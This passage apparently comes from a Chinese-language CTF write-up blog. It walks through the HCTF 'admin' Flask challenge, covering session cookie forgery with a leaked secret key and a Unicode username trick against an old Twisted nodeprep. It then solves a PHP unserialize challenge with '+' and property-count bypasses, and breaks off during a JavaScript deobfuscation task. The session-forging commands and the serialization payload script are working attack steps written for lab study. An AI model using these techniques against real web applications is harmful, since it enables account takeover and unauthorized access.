class="hljs-number">404</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page_not_found</span>(<span class="hljs-params">error</span>):</span><br>    title = unicode(error)<br>    message = error.description<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;errors.html&#x27;</span>, title=title, message=message)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span><br>    username = nodeprep.prepare(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#config.py</span><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    SECRET_KEY = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;ckj123&#x27;</span><br>    SQLALCHEMY_DATABASE_URI = <span class="hljs-string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span><br>    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>从routes.py入手看一下index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">#index.html<br>&#123;% include(&#x27;header.html&#x27;) %&#125;<br>&#123;% if current_user.is_authenticated %&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125;<br>&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125;<br><span class="hljs-comment">&lt;!-- you are not admin --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>&#123;% include(&#x27;footer.html&#x27;) %&#125;<br></code></pre></td></tr></table></figure><p>可见 session值是admin时 我们即取得flag 那么这就涉及session伪造 在routes.py找到<code>login</code>处的<code>current_user.is_authenticated</code>通过GET或者POST登录都可以 现在要解决的就是session的问题 </p><p>抓包看一下<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608100040088.png"></p><p>百度再次查找flask框架的session问题</p><blockquote><p> flask的session是通过加密之后放到了cookie中。所以有加密就有密钥用于解密，所以，只要用到了flask的session模块就一定要配置“SECRET_KEY”这个全局宏。一般设置为24位的字符。配置方法一般有两种。</p><p>配置方法一：</p><p>新建一个config.py的文件配置secret_key </p><p>config.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SECRET_KEY = <span class="hljs-string">&#x27;XXXXXXXXX&#x27;</span><br></code></pre></td></tr></table></figure><p> 然后在主运行文件里面添加config文件里面的内容。 </p><p>main.py或者routes.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br><span class="hljs-keyword">import</span> config<br>app = Flask(__name__)<span class="hljs-number">1.2</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span>.<br></code></pre></td></tr></table></figure><p>配置方法二：</p><p>直接在主运行文件里面配置。配置config的时候也是和操作字典是一样的 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br>app = Flask(__name__)<br><br><span class="hljs-comment">#key值可以使用随机数，或者自定义</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;XXXXX&#x27;</span> <br>或者随机数<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">24</span>)<br>或者<br>app.secret_key = <span class="hljs-string">&#x27;why would I tell you my secret key?&#x27;</span><br></code></pre></td></tr></table></figure></blockquote><p>所以伪造session就需要全局宏<code>SECRET_KEY</code></p><p>此时的config.py里面就是<strong>ckj123</strong></p><blockquote><p> SECRET_KEY = os.environ.get(‘SECRET_KEY’) or ‘ckj123’   #os.environ.get()函数的作用是获取系统的环境变量</p></blockquote><p>说到这里 暑假应该学几个主流的web框架</p><p>使用工具<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><blockquote><p>用法</p><h3 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.<span class="hljs-keyword">py</span> encode [-h] -s <span class="hljs-symbol">&lt;string&gt;</span> -t <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -t <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-structure <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie structure<br></code></pre></td></tr></table></figure><h3 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager.<span class="hljs-keyword">py</span> decode [-h] [-s <span class="hljs-symbol">&lt;string&gt;</span>] -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-value <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie value<br></code></pre></td></tr></table></figure></blockquote><p>使用工具 放入session和密钥进行解密</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> .\flask_sessio<span class="hljs-symbol">n_cookie_manager3</span>.py decode -c <span class="hljs-string">&quot;.eJw9kMFqwkAQhl-lzNlD3NiL4KGStCQwk8suw-xFrMYka2IhKhtXfPduLXgahv_j45-5w-Yw1ucWlpfxWs9g0-1heYe3b1iCZfHI-YT82WG2P4qyjhgT1GuHCpOK85SydV_puGm8EVNHquytLjwpVKKLmyizsM74yA3oipRC6yyTE2d70dRZLZFDRa7scSgmdDJZLnthSavsI6DKPekmFW08DnlSaQlxegl9S2wdhthPNyt4zGB3Hg-by8-xPr1OoIARl4S-ihT1boHavKMrW5uJrzLzp4l1j8FyfhPOg7BtbbN66rph29Qvk-H9ZPx_ctoOMYC5SmEG13M9Pr8G8wQevyIRbIY.YL7OEw.x49ZKtawASOf-9J3S9O9bWjVgTE&quot;</span> -s <span class="hljs-string">&quot;ckj123&quot;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&#123;&#x27;_fresh&#x27;: False, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;&#125;<br></code></pre></td></tr></table></figure><p>然后伪造admin的session</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure><p>放入工具 设置密钥 加密</p><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">python3 .\flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;ef01a11ab07dcfc5c410c3c49a740e9361325cb7bee207c6a22ce8f5040f22778ceccb6ea3be66a3662e2b1261ebeaf78033a0587a502a49632a0c9a5fc31118&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;7332f44b717815922ad60850c9ee93ea2aa3afaf&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;QgqS&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;<span class="hljs-string">&quot; -s &quot;</span>ckj123<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.eJw<span class="hljs-number">9</span>kMFqwkAQhl-lz<span class="hljs-symbol">NlD3</span><span class="hljs-symbol">NiL4</span>KGStCQwk<span class="hljs-number">8</span>suw-xFrMYka<span class="hljs-number">2</span>IhKhtXfPduLXgahv_j<span class="hljs-number">45</span><span class="hljs-number">-5</span>w-Yw<span class="hljs-number">1</span>ucWlpfxWs<span class="hljs-number">9</span><span class="hljs-name">g0</span><span class="hljs-number">-1</span>heYe<span class="hljs-number">3</span>b<span class="hljs-number">1</span>iCZfHI-YT<span class="hljs-number">82</span>W<span class="hljs-name">G2</span>P<span class="hljs-number">4</span>qyjhgT<span class="hljs-number">1</span>GuHCpOK<span class="hljs-number">85</span>SydV_puG<span class="hljs-name">m8</span>EV<span class="hljs-symbol">NHquytLjwpVKKLmyizsM74</span>yA<span class="hljs-number">3</span>oipRC<span class="hljs-number">6</span>yyTE<span class="hljs-number">2</span>d<span class="hljs-number">70</span>dRZLZFDRa<span class="hljs-number">7</span>scSgmdDJZL<span class="hljs-symbol">nthSavsI6</span>DKPekmFW<span class="hljs-number">08</span>D<span class="hljs-symbol">nlSaQlxegl9</span>S<span class="hljs-number">2</span>wdhthP<span class="hljs-symbol">Nyt4</span>zGB<span class="hljs-number">3</span>Hg-by<span class="hljs-number">8</span>-xPr<span class="hljs-number">1</span>OoIARl<span class="hljs-number">4</span>S-ihT<span class="hljs-number">1</span>boHavKMrW<span class="hljs-number">5</span>uJrzLzp<span class="hljs-number">4</span>l<span class="hljs-number">1</span>j<span class="hljs-number">8</span>FyfhPO<span class="hljs-name">g7</span>Btbb<span class="hljs-symbol">N66</span>rph<span class="hljs-number">29</span>Qvk-H<span class="hljs-number">9</span>ZPx_ctoOMYC<span class="hljs-number">5</span>SmE<span class="hljs-name">G13</span><span class="hljs-name">M9</span>Pr<span class="hljs-number">8</span><span class="hljs-name">G8</span>wQevyIRbIY.YL<span class="hljs-number">7</span>RrA.ztSPmJ<span class="hljs-number">8</span>Wrg-xigAr_j<span class="hljs-number">3</span>XyEwrheY<br></code></pre></td></tr></table></figure><p>登录后页面刷新抓包 修改session放包</p><h3 id="方法三、Unicode欺骗"><a href="#方法三、Unicode欺骗" class="headerlink" title="方法三、Unicode欺骗"></a>方法三、Unicode欺骗</h3><p>我们再聚焦于routes.py上  在register和login以及change三个模块上均有strlower()函数 而这个函数不是python的自带函数lower()</p><p> 找一下这个函数原型或者有没有定义</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">def <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br><span class="hljs-function">    username =</span> nodeprep.<span class="hljs-built_in">prepare</span>(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure><p>调用了nodeprep.prepare()函数 继续跟进  发现导入了nodeprep模块 继续跟进发现这是来自twisted库</p><p>再注意到requirements.txt里面描述了twisted的版本 <strong>Twisted==10.2.0</strong>  对比官网发现版本已经很低了  存在有Unicode的漏洞 这个点只能说大多数早期开发都难免有这个问题或那个问题  而Unicode作为比较通用的东西 肯定是要测试的  当然有相关的漏洞报告复现出来更具有说服力  而不是像笔者只能复现wp</p><p>到这个网站<a href="https://unicode-table.com/en/search/?q=Modifier+Letter+Capital">Search - Unicode Character Table (unicode-table.com)</a> 挑选字符ᴬᴰᴹᴵᴺ</p><p>用这个字符注册 那么此时存入数据库的就应该是大写<strong>ADMIN</strong></p><p>那我们登录用ᴬᴰᴹᴵᴺ还是<strong>ADMIN</strong>呢</p><p>注意 登录操作也有一次strlower() 所以仍然需要是要假值ᴬᴰᴹᴵᴺ</p><p>然后 我们目的是修改掉admin的密码 然后以admin登录 </p><p>那么就用change password功能修改密码 此时修改密码时 再次触发strlower()</p><p>此时<strong>ADMIN</strong>就变成了amdin覆盖掉数据库原来的值</p><p>就可以使用admin登录了</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124512198.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124515020.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124538163.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124723891.png"></p><p>登录成功和回显证明ᴬᴰᴹᴵᴺ被转义为<strong>ADMIN</strong></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124748298.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124805856.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124913625.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124926624.png"></p><h3 id="方法四、代码逻辑漏洞"><a href="#方法四、代码逻辑漏洞" class="headerlink" title="方法四、代码逻辑漏洞"></a>方法四、代码逻辑漏洞</h3><p>login函数和change函数都在没有完全check身份的情况下，执行了session有关的赋值</p><h2 id="攻防世界Web-php-unserialize"><a href="#攻防世界Web-php-unserialize" class="headerlink" title="攻防世界Web_php_unserialize"></a>攻防世界Web_php_unserialize</h2><p>这题其实很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @unserialize(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    highlight_file(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>10行：实例化Demo对象fl4g.php时，__wakeup()会重置file变量</p><p>19行：在不区分大小写的情况下 ， 若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式 ， 那么就被过滤。</p><blockquote><p> preg_match()中<strong>i</strong>表示不敏感大小写 里面匹配字符可以**/—/<strong>和</strong>/b—/b**(只匹配单词)匹配内容</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_match(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br>preg_match(<span class="hljs-string">&quot;/\bweb\b/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br><br><span class="hljs-comment">#从URL获取域名 写法一</span><br>preg_match(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<span class="hljs-string">&quot;http://www.php.net/index.html&quot;</span>, <span class="hljs-variable">$matches</span>)<span class="hljs-comment">//匹配http://和/划分开的三部分保存到数组</span><br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<span class="hljs-comment">//提取中间的部分 即www.php.net</span><br>preg_match(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<span class="hljs-comment">//[^.]+中^匹配一次及以上 [^.]+表示不包含.字符的一个或多个字符 进行匹配两次 即得到php net 中间/. 即用.拼接 得到php.net覆盖到变量$matches</span><br><br><span class="hljs-comment">#URL获取域名 写法二</span><br>preg_match(‘/^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">6</span>&#125;)([\/\w \.-]*)*\/?$/’）<br></code></pre></td></tr></table></figure><p> 其他内容 去系统学习一下Perl的正则匹配</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Dmeo(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=serialize(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//o:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&quot;o:4&quot;</span>,<span class="hljs-string">&quot;o:+4&quot;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过正则匹配 具体见博客</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过__wakeup() 这个漏洞详见反序列化漏洞</span><br><span class="hljs-comment">//var_dump($a);</span><br>var_dump(base64_encode(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里需要说的是20、21行注释掉得到的<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p><p>手动修改后<code>O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code>base64加密放到payload不能拿到flag 如下图</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/06/21/.png"></p><p>这里有个坑，这里的file变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大2，如果将序列化结果复制到在线的base64网站进行编码可能就会丢掉空白字符，所以这里直接在php代码里进行编码。类似的还有protected类型的变量，序列化之后字符串首部会加上%00*%00。</p><h2 id="攻防世界NaNNaNNaNNaN-Batman"><a href="#攻防世界NaNNaNNaNNaN-Batman" class="headerlink" title="攻防世界NaNNaNNaNNaN-Batman"></a>攻防世界NaNNaNNaNNaN-Batman</h2><p>下载附件 得到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;script&gt;_=&#x27;function $()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123;[0]);.splice(0,1)&#125;&#125;&#125;\&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;write(s[o%4]buttonif(e.ment&#x27;;for(Y in $=&#x27;&#x27;)with(_.split($[Y]))_=join(pop());eval(_)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>得到乱码 可以使用Sublime Text处理一下</p><p>将上面的代码最后的eval函数换为alert后放到www打开</p><p>得到源码</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/06/23/.png"></p><p>复制下来格式放到<a href="https://beautifier.io/%E5%A4%84%E7%90%86%E4%B8%80%E4%B8%8B">https://beautifier.io/处理一下</a> 得到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;be0f233ac7be98aa&#x27;</span>).value;<br>    <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) &#123;<br>        <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) &#123;<br>            <span 